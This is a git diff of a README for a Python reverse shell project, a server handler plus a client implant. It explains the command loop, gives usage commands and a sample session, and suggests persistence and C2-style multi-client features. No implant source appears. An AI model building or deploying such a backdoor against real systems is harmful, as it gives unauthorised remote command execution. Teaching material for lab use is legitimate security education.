@@ -1,4 +1,5 @@
-# Python Tools For Offensive Security
+
+# 🐚 Python Reverse Shell (Server + Client)
 
 <p align="center">
   <img src="https://img.shields.io/badge/Python-3.x-blue.svg">
@@ -6,65 +7,135 @@
   <img src="https://img.shields.io/badge/Category-Offensive%20Security-red.svg">
 </p>
 
-## Overview
+This project demonstrates a **basic reverse shell** implementation in Python for controlled lab use.  
+It consists of two components:
 
-A collection of powerful Python tools designed for offensive security operations, penetration testing, and security assessments. These tools are built with efficiency, stealth, and effectiveness in mind.
+- **Server (`server.py`)** → The attacker/handler that waits for connections and sends commands.
+    
+- **Client (`client.py`)** → The implant that connects back to the server and executes received commands.
+    
 
-> Disclaimer: These tools are provided for educational and professional security assessment purposes only. Always obtain proper authorization before using these tools against any system or network.
+⚠️ **Disclaimer**: This project is for **educational and authorized penetration testing purposes only**. Do not deploy it on systems you do not own or have explicit permission to test.
 
-## Tools Collection
+## ## 🚀 **Features**
 
-### DNS Enumeration
+- TCP socket communication between server and client.
+    
+- JSON-based encoding/decoding for safe data transfer.
+    
+- Command execution on the client side (including `cd` handling).
+    
+- Error handling for failed connections and invalid commands.
+    
+- Skips empty input (server does not send blank commands).
+    
+- Graceful exit with the `exit` command.
 
-Located in `dns_enumeration/dns_enum.py`, this tool allows for comprehensive DNS reconnaissance, helping security professionals identify subdomains, DNS records, and potential attack vectors through DNS infrastructure.
+## ## 🧩 **Programming Logic**
 
-**Features:**
-- Subdomain enumeration
-- DNS record identification (A, AAAA, MX, NS, TXT, etc.)
-- Zone transfer attempts
-- DNS cache snooping
+### 1. Server (`server.py`)
 
-## Getting Started
-
-### Prerequisites
-
-- Python 3.6+
-- Required Python packages (see requirements below)
-
-### Installation
-
-```bash
-# Clone the repository
-git clone https://github.com/yourusername/Python_Tools_For_Offensive.git
-cd Python_Tools_For_Offensive
-
-# Install required packages
-pip install -r requirements.txt
-```
-## Security Considerations
-
-- Always use these tools in environments where you have explicit permission
-- Consider the legal implications of security testing in your jurisdiction
-- Maintain proper documentation of all testing activities
-
-## Contributing
-
-Contributions are welcome! If you'd like to add new tools or improve existing ones:
-
-1. Fork the repository
-2. Create your feature branch (`git checkout -b feature/amazing-tool`)
-3. Commit your changes (`git commit -m 'Add some amazing tool'`)
-4. Push to the branch (`git push origin feature/amazing-tool`)
-5. Open a Pull Request
-
-## License
-
-This project is licensed under the MIT License - see the LICENSE file for details.
-
-## Contact
-
-For questions, suggestions, or collaboration opportunities, please open an issue in this repository.
+1. **Setup Listener**
+    
+    - Creates a TCP socket bound to the given IP and port.
+        
+    - Waits for a client connection.
+        
+2. **Send & Receive**
+    
+    - Commands from the operator are serialized with `json.dumps` and sent to the client.
+        
+    - Responses from the client are received, reassembled, and deserialized with `json.loads`.
+        
+3. **Command Loop**
+    
+    - Prompts operator with `Shell#:` .
+        
+    - If the input is empty → skip sending.
+        
+    - If `exit` is entered → close session.
+        
+    - Otherwise → send command, wait for client response, print it.
+        
 
 ---
 
-<p align="center"> Happy Hacking! </p>
+### 2. Client (`client.py`)
+
+1. **Connect to Server**
+    
+    - Creates a TCP socket and connects back to the operator’s IP/port.
+        
+2. **Receive & Execute**
+    
+    - Waits for JSON-encoded commands from the server.
+        
+    - Handles special case:
+        
+        - If `exit` → close connection.
+            
+        - If `cd <dir>` → change working directory using `os.chdir()`.
+            
+    - Otherwise executes commands with `os.popen()` and captures output.
+        
+3. **Send Response**
+    
+    - Always sends a JSON response back to the server (command output, error, or directory change confirmation).
+
+## ## 📜 **Usage**
+
+### 1. Start the Server
+
+```python
+python3 server.py <IP> <PORT>
+```
+
+```python
+python3 server.py 192.168.1.23 1234
+```
+
+### 2. Start the Client
+
+Edit the `server('IP', PORT)` line in **client.py** with your server’s IP and port:
+
+```python
+server('192.168.1.3', 1234)`
+```
+
+Then run :
+
+```python
+python3 client.py
+```
+
+### 3. Interact
+
+- From the server console :
+
+```bash
+
+Shell#: ls
+client.py
+requirements.txt
+server.py
+
+Shell#: pwd
+/home/kali/Desktop/Reverse Shell and Backdoor
+
+Shell#: cd ..
+Changed directory to: /home/kali/Desktop
+
+Shell#: exit
+```
+
+## 🔮 Possible Improvements
+
+- Handle large command outputs with streaming/chunking.
+    
+- Add command history and better shell prompt on the server side.
+    
+- Implement encryption (TLS or symmetric encryption) instead of plain-text sockets.
+    
+- Add persistence or multi-client management (C2-style).
+    
+- Replace `os.popen()` with `subprocess.Popen` for more robust execution.
